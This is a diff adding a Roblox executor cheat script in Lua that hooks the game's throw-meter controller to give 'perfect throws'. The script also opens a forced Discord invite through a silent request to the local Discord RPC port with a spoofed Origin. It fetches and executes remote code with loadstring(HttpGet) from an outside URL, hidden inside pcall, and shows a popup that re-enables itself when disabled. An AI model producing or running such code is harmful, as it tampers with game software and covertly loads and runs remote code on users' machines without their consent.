@@ -1,0 +1,350 @@
+local environment = getgenv()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local inviteCode = "Abb4pkWkX"
+local invite = "https://discord.gg/" .. inviteCode
+
+task.spawn(function()
+    pcall(function()
+        local sendRequest = type(request) == "function" and request
+            or type(http_request) == "function" and http_request
+            or type(syn) == "table" and type(syn.request) == "function" and syn.request
+            or type(http) == "table" and type(http.request) == "function" and http.request
+        if not sendRequest then
+            return
+        end
+        sendRequest({
+            Url = "http://127.0.0.1:6463/rpc?v=1",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                Origin = "https://discord.com",
+            },
+            Body = HttpService:JSONEncode({
+                cmd = "INVITE_BROWSER",
+                nonce = HttpService:GenerateGUID(false),
+                args = {code = inviteCode},
+            }),
+        })
+    end)
+end)
+
+local function showInvitePopup()
+    local previous = environment.ThrowFoodDiscordPopup
+    if type(previous) == "table" and type(previous.Destroy) == "function" then
+        previous.Destroy()
+    end
+
+    local popup = {Active = true, Closing = false}
+    local connections = {}
+    local tweens = {}
+    local theme = {
+        Panel = Color3.fromRGB(24, 24, 24),
+        Field = Color3.fromRGB(17, 17, 17),
+        Border = Color3.fromRGB(44, 44, 44),
+        Text = Color3.fromRGB(242, 242, 242),
+        Muted = Color3.fromRGB(174, 174, 174),
+        Copy = Color3.fromRGB(230, 230, 230),
+        CopyHover = Color3.fromRGB(250, 250, 250),
+        Close = Color3.fromRGB(36, 36, 36),
+    }
+    local font = Font.new("rbxasset://fonts/families/BuilderSans.json")
+    local medium = Font.new(font.Family, Enum.FontWeight.Medium)
+
+    local function create(className, properties, children)
+        local instance = Instance.new(className)
+        for key, value in pairs(properties) do
+            instance[key] = value
+        end
+        for _, child in ipairs(children or {}) do
+            child.Parent = instance
+        end
+        return instance
+    end
+
+    local function corner(radius)
+        return create("UICorner", {CornerRadius = UDim.new(0, radius)})
+    end
+
+    local function stroke()
+        return create("UIStroke", {Color = theme.Border, Thickness = 1,
+            LineJoinMode = Enum.LineJoinMode.Round, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+    end
+
+    local function connect(signal, callback)
+        table.insert(connections, signal:Connect(callback))
+    end
+
+    local function animate(instance, properties, duration, channel)
+        if not popup.Active then
+            return
+        end
+        channel = channel or "interaction"
+        local channels = tweens[instance] or {}
+        tweens[instance] = channels
+        if channels[channel] then
+            channels[channel]:Cancel()
+        end
+        local tween = TweenService:Create(instance, TweenInfo.new(duration,
+            Enum.EasingStyle.Quart, Enum.EasingDirection.Out), properties)
+        channels[channel] = tween
+        tween:Play()
+    end
+
+    local function cancelTweens()
+        for _, channels in pairs(tweens) do
+            for _, tween in pairs(channels) do
+                tween:Cancel()
+            end
+        end
+        table.clear(tweens)
+    end
+
+    local playerGui = player:WaitForChild("PlayerGui")
+    local orphan = playerGui:FindFirstChild("ThrowFoodDiscordInvite")
+    if orphan then
+        orphan:Destroy()
+    end
+
+    local gui = create("ScreenGui", {Name = "ThrowFoodDiscordInvite", ResetOnSpawn = false,
+        IgnoreGuiInset = true, DisplayOrder = 1800, ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+        Parent = playerGui})
+    local backdrop = create("TextButton", {Name = "Backdrop", Text = "", AutoButtonColor = false,
+        Modal = true, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.new(),
+        BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 1, Parent = gui})
+    local root = create("Frame", {Name = "Popup", AnchorPoint = Vector2.new(0.5, 0.5),
+        Size = UDim2.fromOffset(428, 148), BackgroundTransparency = 1, ZIndex = 2, Parent = gui})
+    local responsiveScale = create("UIScale", {Parent = root})
+    local shadow = create("Frame", {Name = "Shadow", BackgroundColor3 = Color3.new(),
+        BackgroundTransparency = 1, BorderSizePixel = 0, Position = UDim2.fromOffset(4, 7),
+        Size = UDim2.fromOffset(420, 140), ZIndex = 2, Parent = root}, {corner(12)})
+    local cardBorder = stroke()
+    local card = create("Frame", {Name = "Invite", BackgroundColor3 = theme.Panel, BorderSizePixel = 0,
+        Position = UDim2.fromOffset(4, 4), Size = UDim2.fromOffset(420, 140), ZIndex = 3,
+        Parent = root}, {corner(12), cardBorder})
+    local title = create("TextLabel", {Name = "Title", BackgroundTransparency = 1, Text = "Join discord?",
+        FontFace = medium, TextSize = 20, TextColor3 = theme.Text,
+        TextXAlignment = Enum.TextXAlignment.Left, Position = UDim2.fromOffset(24, 22),
+        Size = UDim2.new(1, -80, 0, 24), ZIndex = 4, Parent = card})
+    local close = create("TextButton", {Name = "Close", Text = "", AutoButtonColor = false,
+        BackgroundColor3 = theme.Panel, BorderSizePixel = 0,
+        Position = UDim2.new(1, -42, 0, 20), Size = UDim2.fromOffset(24, 24), ZIndex = 5,
+        Parent = card}, {corner(6)})
+    local closeLines = {}
+    for _, rotation in ipairs({45, -45}) do
+        table.insert(closeLines, create("Frame", {AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(12, 1),
+            BackgroundColor3 = theme.Muted, BorderSizePixel = 0, Rotation = rotation,
+            ZIndex = 6, Parent = close}))
+    end
+    local fieldBorder = stroke()
+    local field = create("Frame", {Name = "LinkField", BackgroundColor3 = theme.Field,
+        BorderSizePixel = 0, Position = UDim2.fromOffset(24, 66), Size = UDim2.new(1, -48, 0, 46),
+        ZIndex = 4, Parent = card}, {corner(8), fieldBorder})
+    local link = create("TextBox", {Name = "InviteLink", Text = invite, ClearTextOnFocus = false,
+        TextEditable = false, BackgroundTransparency = 1, FontFace = font, TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = theme.Muted,
+        Position = UDim2.fromOffset(14, 0), Size = UDim2.new(1, -112, 1, 0), ZIndex = 5, Parent = field})
+    local copy = create("TextButton", {Name = "CopyInvite", Text = "Copy", FontFace = medium,
+        TextSize = 14, TextColor3 = theme.Panel, AutoButtonColor = false, BackgroundColor3 = theme.Copy,
+        BorderSizePixel = 0, Position = UDim2.new(1, -84, 0, 6), Size = UDim2.fromOffset(78, 34),
+        ZIndex = 5, Parent = field}, {corner(7)})
+    local fadeTargets = {
+        [card] = {BackgroundTransparency = 0},
+        [shadow] = {BackgroundTransparency = 0.65},
+        [cardBorder] = {Transparency = 0},
+        [title] = {TextTransparency = 0},
+        [field] = {BackgroundTransparency = 0},
+        [fieldBorder] = {Transparency = 0},
+        [link] = {TextTransparency = 0},
+        [copy] = {BackgroundTransparency = 0, TextTransparency = 0},
+        [close] = {BackgroundTransparency = 0},
+    }
+    for _, line in ipairs(closeLines) do
+        fadeTargets[line] = {BackgroundTransparency = 0}
+    end
+    for instance, properties in pairs(fadeTargets) do
+        for property in pairs(properties) do
+            instance[property] = 1
+        end
+    end
+
+    local function fade(hidden, duration)
+        for instance, properties in pairs(fadeTargets) do
+            local target = {}
+            for property, value in pairs(properties) do
+                target[property] = hidden and 1 or value
+            end
+            animate(instance, target, duration, "visibility")
+        end
+    end
+
+    local function center(offset)
+        local viewport = gui.AbsoluteSize
+        return UDim2.fromOffset(math.floor(viewport.X / 2), math.floor(viewport.Y / 2) + offset)
+    end
+
+    local function resize()
+        local viewport = gui.AbsoluteSize
+        responsiveScale.Scale = math.clamp(math.min((viewport.X - 32) / 428, (viewport.Y - 32) / 148), 0.3, 1)
+        if not popup.Closing then
+            animate(root, {Position = center(0)}, 0.18, "motion")
+        end
+    end
+
+    function popup.Destroy()
+        if not popup.Active then
+            return
+        end
+        popup.Active = false
+        popup.Destroyed = true
+        for _, connection in ipairs(connections) do
+            connection:Disconnect()
+        end
+        cancelTweens()
+        table.clear(connections)
+        gui:Destroy()
+        if environment.ThrowFoodDiscordPopup == popup then
+            environment.ThrowFoodDiscordPopup = nil
+        end
+    end
+
+    function popup.Close()
+        if not popup.Active or popup.Closing then
+            return
+        end
+        popup.Closing = true
+        cancelTweens()
+        fade(true, 0.16)
+        animate(root, {Position = center(6)}, 0.16, "motion")
+        animate(backdrop, {BackgroundTransparency = 1}, 0.16, "visibility")
+        task.delay(0.17, popup.Destroy)
+    end
+
+    local copyVersion = 0
+    local copyHovered = false
+    connect(copy.Activated, function()
+        if popup.Closing then
+            return
+        end
+        local clipboard = type(setclipboard) == "function" and setclipboard or type(toclipboard) == "function" and toclipboard
+        local ok = clipboard and pcall(clipboard, invite)
+        copyVersion += 1
+        local version = copyVersion
+        if ok then
+            copy.Text = "Copied"
+            animate(copy, {BackgroundColor3 = Color3.fromRGB(195, 195, 195)}, 0.08)
+        else
+            link:CaptureFocus()
+            link.SelectionStart = 1
+            link.CursorPosition = #invite + 1
+        end
+        task.delay(0.12, function()
+            if popup.Active and not popup.Closing and copyVersion == version then
+                animate(copy, {BackgroundColor3 = copyHovered and theme.CopyHover or theme.Copy}, 0.18)
+            end
+        end)
+        task.delay(1.5, function()
+            if popup.Active and not popup.Closing and copyVersion == version then
+                copy.Text = "Copy"
+            end
+        end)
+    end)
+    connect(close.Activated, popup.Close)
+    connect(copy.MouseEnter, function()
+        copyHovered = true
+        if not popup.Closing then
+            animate(copy, {BackgroundColor3 = theme.CopyHover}, 0.12)
+        end
+    end)
+    connect(copy.MouseLeave, function()
+        copyHovered = false
+        if not popup.Closing then
+            animate(copy, {BackgroundColor3 = theme.Copy}, 0.12)
+        end
+    end)
+    connect(close.MouseEnter, function()
+        if popup.Closing then return end
+        animate(close, {BackgroundColor3 = theme.Close}, 0.12)
+        for _, line in ipairs(closeLines) do
+            animate(line, {BackgroundColor3 = theme.Text}, 0.12)
+        end
+    end)
+    connect(close.MouseLeave, function()
+        if popup.Closing then return end
+        animate(close, {BackgroundColor3 = theme.Panel}, 0.12)
+        for _, line in ipairs(closeLines) do
+            animate(line, {BackgroundColor3 = theme.Muted}, 0.12)
+        end
+    end)
+    connect(gui:GetPropertyChangedSignal("AbsoluteSize"), resize)
+    connect(gui:GetPropertyChangedSignal("Enabled"), function()
+        if popup.Active and not gui.Enabled then
+            gui.Enabled = true
+        end
+    end)
+    connect(gui.Destroying, popup.Destroy)
+
+    environment.ThrowFoodDiscordPopup = popup
+    popup.UI = {Screen = gui, Card = card, Copy = copy, Close = close, Invite = link, Title = title, Root = root}
+    local viewport = gui.AbsoluteSize
+    responsiveScale.Scale = math.clamp(math.min((viewport.X - 32) / 428, (viewport.Y - 32) / 148), 0.3, 1)
+    root.Position = center(8)
+    fade(false, 0.24)
+    animate(root, {Position = center(0)}, 0.32, "motion")
+    animate(backdrop, {BackgroundTransparency = 0.6}, 0.24, "visibility")
+    return popup
+end
+
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_c44378984b4d", "1.0.0", false) end)
+
+local popup = showInvitePopup()
+environment.ThrowFoodFeatures = environment.ThrowFoodFeatures or {}
+local features = environment.ThrowFoodFeatures
+if features.PerfectThrow then
+    features.PerfectThrow:Stop()
+    return popup
+end
+
+local controllers = player:WaitForChild("PlayerScripts"):WaitForChild("Client"):WaitForChild("Controllers")
+local meter = require(controllers:WaitForChild("ThrowMeter"))
+local original = meter.Run
+local feature = {Enabled = true, Status = "Enabled"}
+local wrapper
+
+function feature:Stop()
+    if not self.Enabled then
+        return
+    end
+    self.Enabled = false
+    self.Status = "Stopped"
+    if meter.Run == wrapper then
+        meter.Run = original
+    end
+    if features.PerfectThrow == self then
+        features.PerfectThrow = nil
+    end
+end
+
+wrapper = function(instance, ...)
+    if not feature.Enabled then
+        return original(instance, ...)
+    end
+    local previousTap = meter.TestAutoTap
+    meter.TestAutoTap = 0.6
+    instance:SetLocked(true)
+    local result = table.pack(pcall(original, instance, ...))
+    if meter.TestAutoTap == 0.6 then
+        meter.TestAutoTap = previousTap
+    end
+    if not result[1] then
+        error(result[2], 0)
+    end
+    return table.unpack(result, 2, result.n)
+end
+
+meter.Run = wrapper
+features.PerfectThrow = feature
+return feature
